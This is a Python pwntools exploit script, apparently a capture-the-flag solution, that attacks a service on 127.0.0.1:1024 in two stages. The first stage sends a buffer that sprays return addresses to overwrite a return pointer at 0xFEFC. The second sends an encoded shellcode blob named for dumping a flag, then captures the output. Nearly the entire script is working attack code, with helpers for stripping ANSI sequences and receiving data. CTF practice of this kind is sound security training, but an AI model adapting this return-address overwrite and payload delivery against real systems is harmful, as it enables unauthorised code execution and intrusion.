from pwn import *
import sys
import itertools
import re

def pause():
   log.progress("Press any key to continue ...")
   sys.stdin.read(1)

io = remote("127.0.0.1", 1024)

decoderBase = 0x7001
codeBase = 0x710e

stage1_target = p16(0x7d72)
stage2_target = p16(0x7001)

def strip_ansi_b(s: bytes):
    # 7-bit and 8-bit C1 ANSI sequences
    ansi_escape_8bit = re.compile(br'''
        (?: # either 7-bit C1, two bytes, ESC Fe (omitting CSI)
            \x1B
            [@-Z\\-_]
        |   # or a single 8-bit byte Fe (omitting CSI)
            [\x80-\x9A\x9C-\x9F]
        |   # or CSI + control codes
            (?: # 7-bit CSI, ESC [
                \x1B\[
            |   # 8-bit CSI, 9B
                \x9B
            )
            [0-?]*  # Parameter bytes
            [ -/]*  # Intermediate bytes
            [@-~]   # Final byte
        )
    ''', re.VERBOSE)
    return ansi_escape_8bit.sub(b'', s)


def recvall(io):
    buf = b""
    for _ in range(1000):
        try:
            recv = io.recv(1024, timeout=1.5)
            if not recv:
                break
        except:
            break
        buf += recv
    return buf


def batches(iterable, n):
    its = [ iter(iterable) ] * n
    sentinel = object()
    return map(lambda x: filter(lambda i: i is not sentinel, x), itertools.zip_longest(*its, fillvalue=sentinel))

print("Waiting for remote ..")

io.recvuntil(b">")

"""
# wait until remote is ready
buf = recvall(io)
with open("debug1.txt", "w") as fout:
    print(repr(buf), file=fout)
    print("-----------------", file=fout)
    print(repr(strip_ansi_b(buf)), file=fout)
"""

print("Starting stage 1 ..")

stage1_target = p16(0x7d72) # b"\x72\x7d"
stage2_target = p16(0x7021) # b"\x01\x70"

with open("1pwn_dump_flag.bin.encoded", "rb") as fin:
    code = fin.read()

load_base = 0x7e80
ret_ptr_addr = 0xFEFC
my_input1 = (stage1_target + stage2_target + stage2_target) * ((ret_ptr_addr - load_base) // 6 + 40)

my_input2 = code

print("Stage 1 size:", len(my_input1))
# io.send(my_input1)
io.send(my_input1 + b"STOP\r")
result = io.recvpred(lambda buf: strip_ansi_b(buf).endswith(b"STOP\r"), timeout=5)

with open("1pwn_debug_stage1.txt", "w") as fout:
    print(repr(strip_ansi_b(result)), file=fout)

print("Stage 1 delivered.")

print("Starting stage 2 ..")

io.send(my_input2 + b"STOP\r")
result = io.recvpred(lambda buf: strip_ansi_b(buf).endswith(b"STOP\r"), timeout=5)

with open("1pwn_debug_stage2.txt", "w") as fout:
    print(repr(strip_ansi_b(result)), file=fout)

print("Stage 2 delivered. Waiting for remote ..")

buf = recvall(io)
print(repr(strip_ansi_b(buf)))

print("All done :)")
